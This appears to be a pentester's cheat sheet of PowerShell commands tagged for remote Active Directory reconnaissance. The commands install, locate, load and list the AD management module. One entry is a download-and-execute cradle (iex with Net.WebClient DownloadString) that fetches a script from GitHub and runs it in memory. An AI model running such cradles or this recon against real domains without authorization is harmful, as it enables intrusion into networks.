# powershell

% ad, windows, powershell

## powershel - AD - Downoad the AD Module DLL
#plateform/windows #target/remote  #cat/RECON 

```
Get-WindowsCapability -Name RSAT*ActiveDirectory* -Online | Add-WindowsCapability -Online
```

## powershel - AD - Find the AD Module DLL
#plateform/windows #target/remote  #cat/RECON 

```
gci -Path 'C:\Windows' -Recurse -Filter 'Microsoft.ActiveDirectory.Management.dll' -EA SilentlyContinue | ? {$_.FullName -like '*GAC_64*' -or $_.FullName -like '*amd64*'} | select -Expand FullName
```

## powershel - AD - download and load AD Module
#plateform/windows #target/remote  #cat/RECON 

```
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```

## powershel - AD - load AD Module
#plateform/windows #target/remote  #cat/RECON 

```
Import-Module .\Microsoft.ActiveDirectory.Management.dll
```

## powershel - AD - Check commands
#plateform/windows #target/remote  #cat/RECON 

```
Get-Command -Module Microsoft.ActiveDirectory.Management
```


